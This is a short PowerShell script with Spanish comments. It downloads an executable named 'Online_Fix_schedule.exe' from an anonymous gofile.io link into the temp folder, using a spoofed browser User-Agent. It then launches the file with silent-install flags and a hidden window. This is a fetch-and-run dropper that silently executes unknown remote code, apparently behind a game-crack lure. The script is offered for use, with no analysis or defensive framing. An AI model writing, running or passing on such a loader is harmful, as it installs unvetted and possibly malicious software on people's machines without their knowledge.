# Ruta temporal
$tempPath = "$env:TEMP\Online_Fix_schedule.exe"

# URL del .exe (verifica que funcione)
$url = "https://store10.gofile.io/download/web/eac7e870-f22a-4062-9a8c-194acd0c58b3/Online_Fix_schedule.exe"

# Headers para simular navegador
$headers = @{
    "User-Agent" = "Mozilla/5.0"
}

# Descargar con headers
Invoke-WebRequest -Uri $url -OutFile $tempPath -Headers $headers -UseBasicParsing

# Esperar un poco
Start-Sleep -Seconds 2

# Ejecutar
Start-Process -FilePath $tempPath -ArgumentList "/silent", "/verysilent", "/norestart" -WindowStyle Hidden
